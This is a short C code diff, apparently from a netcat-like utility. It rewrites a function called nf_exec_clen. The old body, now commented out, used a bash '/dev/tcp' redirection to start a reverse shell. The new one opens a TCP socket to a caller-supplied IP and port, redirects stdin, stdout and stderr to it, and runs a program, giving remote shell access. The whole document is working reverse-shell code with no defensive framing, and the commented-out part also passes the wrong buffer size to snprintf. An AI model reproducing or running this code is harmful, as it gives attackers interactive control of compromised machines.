@@ -73,12 +73,25 @@ void nf_exec_serv(char * ip, int port_start, char * filename)
 
 void nf_exec_clen(char * ip, int port_start, char * filename)
 {
+    /*
     char cmd[1024] = {0};
     char port[6] = {0};
     //itoa(port_start, port, 10);
     snprintf(port, sizeof(cmd), "%d", port_start);
     sprintf(cmd, "%s -i >& /dev/tcp/%s/%s <&2", filename, ip, port);
     system(cmd);
+    */
+    int clnt_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    struct sockaddr_in serv_addr;
+    memset(&serv_addr, 0, sizeof(serv_addr));
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_addr.s_addr = inet_addr(ip);
+    serv_addr.sin_port = htons(port_start);
+    connect(clnt_sock, (struct sockaddr*)&serv_addr, sizeof(serv_addr));
+    dup2(clnt_sock, 0);
+    dup2(clnt_sock, 1);
+    dup2(clnt_sock, 2);
+    system(filename);
 	return;
 }
 
